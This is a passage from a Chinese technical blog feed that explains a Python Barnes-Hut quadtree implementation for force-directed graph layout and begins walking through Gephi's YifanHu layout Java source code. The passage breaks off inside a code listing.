<h3 id="简而析之："><a href="#简而析之：" class="headerlink" title="简而析之："></a><strong>简而析之：</strong></h3><blockquote>
<p>1.在插入节点的时候，首先需要找到一个没有节点存在的新区域，然后把节点放置进去，<strong>分两种情况</strong>：(假设已经搜索到一个目前已存在的最小区域)</p>
</blockquote>
<p><strong>第一种：</strong>目前已划分的区域中有不存在节点的，刚好这个节点的位置在这个区域内，那么理所当然可以直接放入，插入完毕</p>
<p><strong>第二种：</strong>这个节点需要放置进去的区域内已存在节点，那么需要把这个区域不断四分，直到能够将这两个节点区分开来，这时候就要边四分边判断是否存在之前的节点</p>
<blockquote>
<p>2.<strong>插入过程中重心更新的注意事项也是分为两点，与上面相对应</strong></p>
</blockquote>
<p><strong>第一点：</strong> 如果刚好能找到一个已存在的最小区域，那么需要在这个过程中更新所有父节点的重心，当然包括新节点的区域重心</p>
<p><strong>第二点：</strong> 如果需要进行新的四分才能找到新节点放置的区域，那么除了上述父重心的更新外，还需要对新划分的所有区域进行重心的更新(试想一下，如果之前存在的点刚好可以放进新划分的区域，那么新划分的区域重心肯定不为0，需要及时进行更新)，因此遇到上述第二种不断四分的情况，需要将原来存在的点不断代入并进行新重心的更新</p>
<blockquote>
<p>对于第二点比较复杂的情况，我也同样用图来展示:</p>
</blockquote>
<p><img src="http://op72m4y17.bkt.clouddn.com/Figure_2.png" alt=""><br><img src="http://op72m4y17.bkt.clouddn.com/Figure_2-1.png" alt=""><br><img src="http://op72m4y17.bkt.clouddn.com/Figure_2-2.png" alt=""><br><img src="http://op72m4y17.bkt.clouddn.com/Figure_2-3.png" alt=""></p>
<ul>
<li>注意到位于边界上的点实际上不需要额外划分，例如上图中的(0, 0),上述插入过程的函数实现如下：<h3 id="2-加入新节点"><a href="#2-加入新节点" class="headerlink" title="2.加入新节点"></a>2.加入新节点</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div></pre></td><td class="code"><pre><div class="line">def insert_node(self, node):</div><div class="line">	if self.min_x &lt;= node[0] &lt;= self.min_x + self.size and self.min_y &lt;= node[1] &lt;= self.min_y + self.size:</div><div class="line"></div><div class="line">		# 1.输出吸收节点的过程描述(前) 包括吸收的层级、吸收的区域坐标、吸收区域的重心</div><div class="line">		if description:</div><div class="line">			print(&apos;The quad-part that will assimilate (%.2f, %.2f):&apos; % (node[0], node[1]))</div><div class="line">			print(&quot;Max-depth:%d  [sw(%.2f, %.2f), nw(%.2f, %.2f),ne(%.2f, %.2f),se(%.2f, %.2f)] Mess_center: (%.2f, %.2f)\n&quot;</div><div class="line">			      % (self.max_dep, self.min_x, self.min_y, self.min_x, self.min_y + self.size, self.min_x + self.size, self.min_y + self.size,</div><div class="line">			          self.min_x + self.size, self.min_y, self.mass_center[0], self.mass_center[1]))</div><div class="line"></div><div class="line">		# 先把原重心保存，如果是叶子节点的话需要做进一步单一性判定</div><div class="line">		ori_node = [i for i in self.mass_center]</div><div class="line"></div><div class="line">		# 递归容纳进这个节点,并改变每个区域总质量和重心位置</div><div class="line">		self.assimilateNode(node)</div><div class="line"></div><div class="line">		# 2.输出吸收节点的过程描述(后)</div><div class="line">		if description:</div><div class="line">			print(&apos;After assimilating (%.2f, %.2f):&apos; % (node[0], node[1]))</div><div class="line">			print(&quot;Max-depth:%d  [sw(%.2f, %.2f), nw(%.2f, %.2f),ne(%.2f, %.2f),se(%.2f, %.2f)] Mess_center: (%.2f, %.2f)\n&quot;</div><div class="line">			      % (self.max_dep, self.min_x, self.min_y, self.min_x, self.min_y + self.size, self.min_x + self.size, self.min_y + self.size,</div><div class="line">			          self.min_x + self.size, self.min_y, self.mass_center[0], self.mass_center[1]))</div><div class="line"></div><div class="line">		if self.isleaf:</div><div class="line">			self.quad_divide()</div><div class="line">			# 3.新插入区域的重心，也就是新节点的坐标</div><div class="line">			if description:</div><div class="line">				print(&apos;New Children Mess-Center: (%.2f, %.2f)\n&apos; % (self.mass_center[0], self.mass_center[1]))</div><div class="line"></div><div class="line">			# 需要将新节点插入到当前节点不存在的区域</div><div class="line">			ori_update = new_update = False</div><div class="line">			for i in self.children:</div><div class="line">				if ori_node[0] * ori_node[1] != 0.0 and i.min_x &lt;= ori_node[0] &lt;= i.min_x + i.size and i.min_y &lt;= ori_node[1] &lt;= i.min_y + i.size:</div><div class="line">					# 4.该区域内包含之前的节点则递归切分再插入</div><div class="line">					if description:</div><div class="line">						print(&quot;## Located at the same part -&gt; Start recurisve divisions again to insert&quot;)</div><div class="line">					i.quad_insert(ori_node)</div><div class="line">					if description:</div><div class="line">						print(&quot;## Initialize this part by the existed node\n&quot;)</div><div class="line">					ori_update = True</div><div class="line">					if i.min_x &lt;= node[0] &lt;= i.min_x + i.size and i.min_y &lt;= node[1] &lt;= i.min_y + i.size:</div><div class="line">						if i.insert_node(node):</div><div class="line">							return True</div><div class="line">				if i.quad_insert(node):</div><div class="line">					new_update = True</div><div class="line">				if ori_update and new_update:</div><div class="line">					return True</div><div class="line">		else:</div><div class="line">			for i in self.children:</div><div class="line">				if i.insert_node(node):</div><div class="line">					return True</div><div class="line">	else:</div><div class="line">		return False</div></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="3-节点插入子树"><a href="#3-节点插入子树" class="headerlink" title="3.节点插入子树"></a>3.节点插入子树</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"># 3.节点插入子树</div><div class="line">def quad_insert(self, node):</div><div class="line">	global node_num</div><div class="line">	if self.min_x &lt;= node[0] &lt;= self.min_x + self.size and self.min_y &lt;= node[1] &lt;= self.min_y + self.size:</div><div class="line"></div><div class="line">		# 该区域容纳进这个节点,并改变总质量和重心位置</div><div class="line">		self.assimilateNode(node)</div><div class="line">		if visualization:</div><div class="line">			plt.scatter(node[0], node[1], marker=&apos;o&apos;, color=&apos;b&apos;, s=1)</div><div class="line">		node_num += 1</div><div class="line">		# 6.成功插入的提示，包括3递归过程中先插入原来已有的节点来更新该区域的重心</div><div class="line">		if description:</div><div class="line">			print(&quot;## (%.2f, %.2f) Successfully insert 1/4 of above part [sw(%.2f, %.2f), nw(%.2f, %.2f),ne(%.2f, %.2f),se(%.2f, %.2f)]\n&quot; %</div><div class="line">			      (node[0], node[1], self.min_x, self.min_y, self.min_x, self.min_y + self.size, self.min_x + self.size, self.min_y + self.size,</div><div class="line">			          self.min_x + self.size, self.min_y))</div><div class="line">		return True</div><div class="line">	else:</div><div class="line">		return False</div></pre></td></tr></table></figure>
<h3 id="4-更新区域重心"><a href="#4-更新区域重心" class="headerlink" title="4.更新区域重心"></a>4.更新区域重心</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"># 4.更新区域重心</div><div class="line">def assimilateNode(self, node):</div><div class="line">	self.mass_center[0] = (self.mass * self.mass_center[0] + node[0]) / (self.mass + 1)</div><div class="line">	self.mass_center[1] = (self.mass * self.mass_center[1] + node[1]) / (self.mass + 1)</div><div class="line">	self.mass += 1</div></pre></td></tr></table></figure>
<h3 id="5-获取与该点-距离-区域-大小不超过阈值的所有点或重心"><a href="#5-获取与该点-距离-区域-大小不超过阈值的所有点或重心" class="headerlink" title="5.获取与该点(距离/区域)大小不超过阈值的所有点或重心"></a>5.获取与该点(距离/区域)大小不超过阈值的所有点或重心</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"># 5.获取与该点(距离/区域)大小不超过阈值的所有点或重心</div><div class="line">def get_farthest_mass(self, node, threshold, pos_arr):</div><div class="line">	# 去除本身</div><div class="line">	if node[0] == self.mass_center[0] and node[1] == self.mass_center[1]:</div><div class="line">		return</div><div class="line">	# 如果该区域大小/距离 小于阈值，则没有搜索的必要，直接计算重心给予的力</div><div class="line">	if self.size / math.sqrt((node[0] - self.mass_center[0]) ** 2 + (node[1] - self.mass_center[1]) ** 2) &lt; threshold\</div><div class="line">			and not self.isleaf:</div><div class="line">		# 返回重心所在区域的节点数，重心坐标</div><div class="line">		pos_arr.append([self.mass, self.mass_center])</div><div class="line">		return</div><div class="line">	# 如果是叶子节点且存在点的话，说明已经搜索到该区域的尽头，直接计算该区域重心(即唯一的点)给予的力</div><div class="line">	elif self.isleaf and self.mass != 0:</div><div class="line">		pos_arr.append([self.mass, self.mass_center])</div><div class="line">	for i in self.children:</div><div class="line">		i.get_farthest_mass(node, threshold, pos_arr)</div></pre></td></tr></table></figure>
<h3 id="6-获取所有不为空的区域的重心"><a href="#6-获取所有不为空的区域的重心" class="headerlink" title="6.获取所有不为空的区域的重心"></a>6.获取所有不为空的区域的重心</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"># 6.获取所有不为空的区域的重心</div><div class="line">def get_all_mass_center(self, centers):</div><div class="line">	if len(self.children) == 0:</div><div class="line">		return</div><div class="line">	for i in self.children:</div><div class="line">		if i.mass_center[0] * i.mass_center[1] != 0.0:</div><div class="line">			if visualization:</div><div class="line">				plt.scatter(i.mass_center[0], i.mass_center[1], marker=&quot;D&quot;, color=&quot;r&quot;, s=2)</div><div class="line">			# 返回重心所在区域的大小，重点所在区域的节点数，重心坐标</div><div class="line">			centers.append([i.size, i.mass, i.mass_center])</div><div class="line">			i.get_all_mass_center(centers)</div></pre></td></tr></table></figure>
<blockquote>
<p>随机生成100个节点的图，画布大小为1000<em>1000，节点坐标x,y都为[0,1000]的随机数，原图(蓝点)与重心图(红点)对比如下:（<em>*新的红点为中间节点的重心，红蓝交叠说明是叶子节点的重心</em></em>）</p>
</blockquote>
<p><img src="http://op72m4y17.bkt.clouddn.com/node_100.png" alt=""><br><img src="http://op72m4y17.bkt.clouddn.com/node_100_mass.png" alt=""></p>
<h3 id="7-计算每一个点所受到的斥力electric-forces偏移量"><a href="#7-计算每一个点所受到的斥力electric-forces偏移量" class="headerlink" title="7.计算每一个点所受到的斥力electric forces偏移量"></a>7.计算每一个点所受到的斥力electric forces偏移量</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"># 7.计算每一个点所受到的斥力electric偏移量</div><div class="line"># 公式为fr(i,j) = -C*K**2 / ||xi - xj||</div><div class="line"># 亦可写成fr&apos;(i,j) = -C*K**2 / ||xi - xj||**2 * (xi - xj)</div><div class="line">def cal_electrical_forces(self, node, threshold, c, k, e_force_vector):</div><div class="line">	# e_force_vector即为displacement =&gt; node距离重心控制在threshold以内的所有点对其施力的偏移量</div><div class="line">	# 去除本身</div><div class="line">	if node[0] == self.mass_center[0] and node[1] == self.mass_center[1]:</div><div class="line">		return</div><div class="line">	# 如果该区域大小/距离 小于阈值，则没有搜索的必要，直接计算重心给予的力</div><div class="line">	if self.size / math.sqrt(</div><div class="line">							(node[0] - self.mass_center[0]) ** 2 + (node[1] - self.mass_center[1]) ** 2) &lt; threshold \</div><div class="line">			and not self.isleaf:</div><div class="line">		# distance = math.sqrt((self.mass_center[0] - node[0]) ** 2 + (self.mass_center[1] - node[1]) ** 2)</div><div class="line">		distance_sqr = (self.mass_center[0] - node[0]) ** 2 + (self.mass_center[1] - node[1]) ** 2</div><div class="line">		# fr(i,j) = -C*K**2 / ||xi - xj||</div><div class="line">		# 若按照公式来，fr(i,j)取负，那么方向为 施力点node(j) - 受力点node(i)</div><div class="line">		# 但我们使用受力点向量与施力点向量的差 node(i) - node(j)，所以此处fr(i,j)取正</div><div class="line">		# 力的大小与重心的大小self.mass成正比</div><div class="line">		e_force_vector[0] += (node[0] - self.mass_center[0]) * (c * k ** 2 / distance_sqr) * self.mass</div><div class="line">		e_force_vector[1] += (node[1] - self.mass_center[1]) * (c * k ** 2 / distance_sqr) * self.mass</div><div class="line">		return</div><div class="line">	# 如果是叶子节点且存在点的话，说明已经搜索到该区域的尽头，直接计算该区域重心(即唯一的点)给予的力</div><div class="line">	elif self.isleaf and self.mass != 0:</div><div class="line">		distance_sqr = (self.mass_center[0] - node[0]) ** 2 + (self.mass_center[1] - node[1]) ** 2</div><div class="line">		e_force_vector[0] += (node[0] - self.mass_center[0]) * (c * k ** 2 / distance_sqr)</div><div class="line">		e_force_vector[1] += (node[1] - self.mass_center[1]) * (c * k ** 2 / distance_sqr)</div><div class="line">	# 达到最大分割次数的区域，不再遍历子树</div><div class="line">	if self.children == [self]:</div><div class="line">		return</div><div class="line">	for i in self.children:</div><div class="line">		i.cal_electrical_forces(node, threshold, c, k, e_force_vector)</div></pre></td></tr></table></figure>
<blockquote>
<p>计算electric forces偏移量是为Yifanhu layout服务的，就跟上一篇所说，四叉树(Barnes-Hut算法)在Yifanhu layout中起到节点计算优化的作用，我将会在下一篇讲解YifanHu的具体实现。</p>
</blockquote>
<h3 id="对比Barnes-Hut算法和普通方法的效率"><a href="#对比Barnes-Hut算法和普通方法的效率" class="headerlink" title="对比Barnes-Hut算法和普通方法的效率"></a>对比Barnes-Hut算法和普通方法的效率</h3><p>直接上图(已将对比效率的代码也更新进我的源代码)：<br><img src="http://op72m4y17.bkt.clouddn.com/eff_1.png" alt=""></p>
<blockquote>
<p>可以很直观地看到,利用四叉树搜索和计算的效率大大低于直接两层循环的计算，这也跟设置的搜索阈值有关，此处设置为1.2，若设置为0则退化成原来O(n^2)的复杂度</p>
</blockquote>
<h3 id="有趣的新发现"><a href="#有趣的新发现" class="headerlink" title="有趣的新发现"></a>有趣的新发现</h3><p><strong>在写这篇博客跑上述效率对比实验时，发现了cal electrical forces这个函数计算效率上的一些问题，如下:</strong><br><img src="http://op72m4y17.bkt.clouddn.com/eff_2.png" alt=""></p>
<blockquote>
<p>是否是自己写cal electrical force递归函数的时候还需要剪枝，或者说递归判断的效率不高？这是个值得探讨的问题，从上图可以看出，先调用get farthest mass获取需要跟该节点计算力的所有点(或重心)的坐标，再进行迭代计算比直接递归寻找需要跟该节点计算力的所有点(或重心)的坐标计算速度稍微快了一点，而且在2000节点的时候就已经明显看出来了，到了大规模计算(上万节点时)可能差别会更大，所以接下来要构造的YifanHu布局可能需要重新考虑一下斥力的计算方式，后续会继续更新所有优化后的<a href="https://github.com/Kali-Hac/YifanHu_python/blob/master/Barnes_Hut/_quadtree.py" target="_blank" rel="external">代码</a>。</p>
</blockquote>
<p><strong>When reality is not as good as ideal, fighter will accept it; When reality is close to ideal, fighter will explore their distance.</strong><br><img src="http://op72m4y17.bkt.clouddn.com/1.jpg" alt=""></p>
]]></content>
      
        <categories>
            
            <category> Social Network Layout </category>
            
            <category> Network Optimization </category>
            
            <category> Yifanhu </category>
            
        </categories>
        
        
        <tags>
            
            <tag> [object Object] </tag>
            
            <tag> Force-Directed Algorithms </tag>
            
            <tag> Barnes–Hut Force Calculation </tag>
            
            <tag> Quadtree </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[确认下眼神，Yifanhu Layout源码解析]]></title>
      <url>http://yikunhaocong.com/2018/04/24/Yifanhu_source_code/</url>
      <content type="html"><![CDATA[<p></p><h2 id="intro">前言</h2><br>    <strong>本博文仅针对Gephi实现Yifanhu Layout算法的<a href="https://github.com/gephi/gephi/tree/master/modules/LayoutPlugin/src/main/java/org/gephi/layout/plugin/force" target="_blank" rel="external">Jave源码</a>关键部分进行解析，亦当自己的学习笔记。下一篇会接着讲Quadtree和Barnes–Hut算法的Python重现</strong><br><a id="more"></a><br>【传送门：网络布局集大成之作】 <a href="http://www.mathematica-journal.com/issue/v10i1/contents/graph_draw/graph_draw.pdf" target="_blank" rel="external">Efficient, High-Quality Force-Directed Graph Drawing - Yifanhu</a><p></p>
<blockquote>
<p>在讲代码之前，先稍微过一下源码所用到的算法及原理：</p>
</blockquote>
<p><img src="http://op72m4y17.bkt.clouddn.com/yfh_1.png" alt=""><br><img src="http://op72m4y17.bkt.clouddn.com/yfh_2.png" alt=""><br><img src="http://op72m4y17.bkt.clouddn.com/yfh_4.png" alt=""><br><img src="http://op72m4y17.bkt.clouddn.com/yfh_5.png" alt=""><br><img src="http://op72m4y17.bkt.clouddn.com/yfh_6.png" alt=""></p>
<blockquote>
<p>从上面可以看到，使用四叉树(BarnesHut算法)可以将原来N-body问题O(n^2)复杂度优化到O(nlogn)，对于大规模网络而言可以说是非常大的优化了。<br>那接下来就开始对源码进行简单的解析，你也可以直接访问下面的github地址自行阅读：<br><strong><a href="https://github.com/gephi/gephi/tree/master/modules/LayoutPlugin/src/main/java/org/gephi/layout/plugin/force" target="_blank" rel="external">Gephi_YifanHu_layout</a></strong></p>
</blockquote>
<h2 id="quadtree模块"><a href="#quadtree模块" class="headerlink" title="quadtree模块"></a>quadtree模块</h2><h3 id="BarnesHut-java"><a href="#BarnesHut-java" class="headerlink" title="BarnesHut.java"></a>BarnesHut.java</h3><p><strong> <a href="https://github.com/gephi/gephi/blob/master/modules/LayoutPlugin/src/main/java/org/gephi/layout/plugin/force/quadtree/BarnesHut.java" target="_blank" rel="external">class BarnesHut : 点击此处查看源码</a></strong><br>[成员变量及函数]<br><strong>1.private float theta = (float) 1.2;</strong><br>/<em> theta is the parameter for Barnes-Hut opening criteria
     </em>/<br> =&gt; N-body下限制搜寻和计算的范围<br>—— 当 size / d &lt; theta 时， 才进入该区域搜寻和计算 <strong>①</strong><br>—— size为该区域的大小， d为点到该区域重心的距离</p>
<p><strong>2.public ForceVector calculateForce(Node node, QuadTree tree)</strong><br> /<em> Calculates the ForceVector on node against every other node represented in the tree with respect to force.</em>/<br>=&gt; 递归计算node到最远QuadTree重心的力<br>—— 当与某区域的重心距离满足<strong>①</strong>时，则计算与该区域所有点的力<br>—— 当不满足时，则只计算点到重心的受力,如下：<br><img src="http://op72m4y17.bkt.clouddn.com/yfh_5.png" alt=""></p>
<h3 id="QuadTree-java"><a href="#QuadTree-java" class="headerlink" title="QuadTree.java"></a>QuadTree.java</h3><p><strong><a href="https://github.com/gephi/gephi/blob/master/modules/LayoutPlugin/src/main/java/org/gephi/layout/plugin/force/quadtree/QuadTree.java" target="_blank" rel="external">class QuadTree：点击此处查看源码</a></strong><br>[成员变量及函数]<br><strong>1.private final float posX;private final float posY;</strong><br>=&gt; 区域起始点，例如正方区域(0,0),(0,100)(100,100)(100,0)的起始点为左下角的点(0,0)</p>
<p><strong>2. private float centerMassX;private float centerMassY;</strong><br>/<em>X and Y position of the center of mass</em>/<br>=&gt; 区域重心坐标</p>
<p><strong>3. private int mass;</strong><br>/<em>Mass of this tree (the number of nodes it contains)</em>/<br>=&gt; 该区域总质量，这里假设每个节点质量为1，则它即为区域节点数量</p>
<p><strong>4.private final float size;</strong><br>=&gt; 区域大小，与<strong>1</strong>相对应</p>
<p><strong>5.private final int maxLevel;</strong><br>=&gt; 该区域最大可四分次数，例如maxLevel=100，最大可分割100次</p>
<p><strong>6.private List<quadtree> children;</quadtree></strong><br>=&gt; 存取四叉树的每棵子树</p>
<p><strong>7.private boolean isLeaf;</strong><br>=&gt; 判断是否为叶节点，四叉树规定每个节点都需要放入一个最小的四分区域，该区域成为四叉树的叶节点，较大的包含多个节点的区域称为中间节点</p>
<p><strong>8. public static QuadTree buildTree(Graph graph, int maxLevel)</strong><br>=&gt; 建树，需要规定最大四分次数和传入一个Graph</p>
<p><strong>9. public QuadTree(float posX, float posY, float size, int maxLevel)</strong><br>=&gt; 建立一棵覆盖区域为(posX, posY),(posX + size, posY),(posX, posY + size),(posX + size, posY + size)，最大四分次数为maxLevel的四叉树</p>
<p><strong>10. private void divideTree()</strong><br>=&gt; 将本身区域等分为四个区域，建立四棵子树</p>
<p><strong>11.private void assimilateNode(NodeProperties node)</strong><br>=&gt; 每当有一个节点插入一个新的小区域时，需要调用此函数进行各个父区域的重心更新，当然包括自身区域</p>
<p><strong>12.重点讲讲下面这一段加入节点的代码</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div></pre></td><td class="code"><pre><div class="line">class FirstAdd implements AddBehaviour &#123;</div><div class="line"></div><div class="line">        @Override</div><div class="line">        public boolean addNode(NodeProperties node) &#123;</div><div class="line">            mass = 1;</div><div class="line">            centerMassX = node.x();</div><div class="line">            centerMassY = node.y();</div><div class="line"></div><div class="line">            if (maxLevel == 0) &#123;</div><div class="line">                add = new LeafAdd();</div><div class="line">            &#125; else &#123;</div><div class="line">                add = new SecondAdd();</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            return true;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    class SecondAdd implements AddBehaviour &#123;</div><div class="line"></div><div class="line">        @Override</div><div class="line">        public boolean addNode(NodeProperties node) &#123;</div><div class="line">            divideTree();</div><div class="line">            add = new RootAdd();</div><div class="line">            /* This QuadTree represents one node, add it to a child accordingly</div><div class="line">             */</div><div class="line">            addToChildren(QuadTree.this);</div><div class="line">            return add.addNode(node);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    class LeafAdd implements AddBehaviour &#123;</div><div class="line"></div><div class="line">        @Override</div><div class="line">        public boolean addNode(NodeProperties node) &#123;</div><div class="line">            assimilateNode(node);</div><div class="line">            return true;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    class RootAdd implements AddBehaviour &#123;</div><div class="line"></div><div class="line">        @Override</div><div class="line">        public boolean addNode(NodeProperties node) &#123;</div><div class="line">            assimilateNode(node);</div><div class="line">            return addToChildren(node);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h3 id="简而析之："><a href="#简而析之：" class="headerlink" title="简而析之："></a><strong>简而析之：</strong></h3><blockquote>
<p>1.在插入节点的时候，首先需要找到一个没有节点存在的新区域，然后把节点放置进去，<strong>分两种情况</strong>：(假设已经搜索到一个目前已存在的最小区域)</p>
</blockquote>
<p><strong>第一种：</strong>目前已划分的区域中有不存在节点的，刚好这个节点的位置在这个区域内，那么理所当然可以直接放入，插入完毕</p>
<p><strong>第二种：</strong>这个节点需要放置进去的区域内已存在节点，那么需要把这个区域不断四分，直到能够将这两个节点区分开来，这时候就要边四分边判断是否存在之前的节点</p>
<blockquote>
<p>2.<strong>插入过程中重心更新的注意事项也是分为两点，与上面相对应</strong></p>
</blockquote>
<p><strong>第一点：</strong> 如果刚好能找到一个已存在的最小区域，那么需要在这个过程中更新所有父节点的重心，当然包括新节点的区域重心</p>
<p><strong>第二点：</strong> 如果需要进行新的四分才能找到新节点放置的区域，那么除了上述父重心的更新外，还需要对新划分的所有区域进行重心的更新(试想一下，如果之前存在的点刚好可以放进新划分的区域，那么新划分的区域重心肯定不为0，需要及时进行更新)，因此遇到上述第二种不断四分的情况，需要将原来存在的点不断代入并进行新重心的更新</p>
<h2 id="yifanhu模块"><a href="#yifanhu模块" class="headerlink" title="yifanhu模块"></a>yifanhu模块</h2><h3 id="YifanHuLayout-java"><a href="#YifanHuLayout-java" class="headerlink" title="YifanHuLayout.java"></a>YifanHuLayout.java</h3><p><strong><a href="https://github.com/gephi/gephi/blob/master/modules/LayoutPlugin/src/main/java/org/gephi/layout/plugin/force/yifanHu/YifanHuLayout.java" target="_blank" rel="external">class YifanHuLayout：点击此处查看源码</a></strong><br>[成员变量及函数]<br><strong>1.private float optimalDistance;</strong><br>=&gt; 布局中距离的优化目标<br><strong>此处设置为Math.pow(getRelativeStrength(), 1.0 / 3) x getAverageEdgeLength(graph)，即(斥力相对于引力的比例的三分一次方 乘以 网络图边的平均长度</strong></p>
<p><strong>2.private float relativeStrength;</strong><br>=&gt; 斥力相对于引力的比例系数<br><strong>此处设置为0.2</strong></p>
<p><strong>3.private float step;</strong><br>=&gt; (力矢量)坐标更新的步长<br><strong>此处设置为optimalDistance/5</strong></p>
<p><strong>4.private float initialStep;</strong><br>=&gt; 初始步长<br><strong>此处设置为optimalDistance/5</strong></p>
<p><strong>5.private int progress;</strong><br>=&gt; 可以理解为正反馈次数，如果当前更新的方向是正确的，且正反馈的次数大于5，则加大更新步长 step = step / StepRatio（小于1）</p>
<p><strong>6.private float stepRatio;</strong><br>=&gt; 步长更新率的倒数<br><strong>此处设置为0.95</strong></p>
<p><strong>7.private int quadTreeMaxLevel;</strong><br>=&gt; 四叉树最大四分次数<br><strong>此处设置为10</strong></p>
<p><strong>8.private float barnesHutTheta;</strong><br>=&gt; BarnesHut算法搜寻重心和计算的阈值<br><strong>此处设置为1.2</strong></p>
<p><strong>9.private float convergenceThreshold;</strong><br><strong>此处设置为1e-4</strong></p>
<p><strong>10.private boolean adaptiveCooling;</strong><br>=&gt; 自适应退火算法的开启，与<strong>5</strong>相对应<br><strong>此处设置为true</strong><br><img src="http://op72m4y17.bkt.clouddn.com/yfh_3.png" alt=""></p>
<p><strong>11.private Displacement displacement;</strong><br>=&gt; 通过力的计算，节点需要偏移的位置</p>
<p><strong>12.private double energy0;</strong><br>=&gt; 初始布局的能量</p>
<p><strong>13.private double energy;</strong><br>=&gt; 当前布局的能量</p>
<p><strong>14.private Graph graph;</strong><br>=&gt; 整个网络图</p>
<p><strong>15.private void updateStep()</strong><br>=&gt; 自适应退火算法，更新步长，与<strong>5</strong>和<strong>10</strong>相对应</p>
<p><strong>16. public void resetPropertiesValues()</strong><br>=&gt; 初始化所有参数</p>
<p><strong>17.public float getAverageEdgeLength(Graph graph)</strong><br>=&gt; 计算图中所有边的平均长度</p>
<blockquote>
<p><strong>主要运行函数</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div 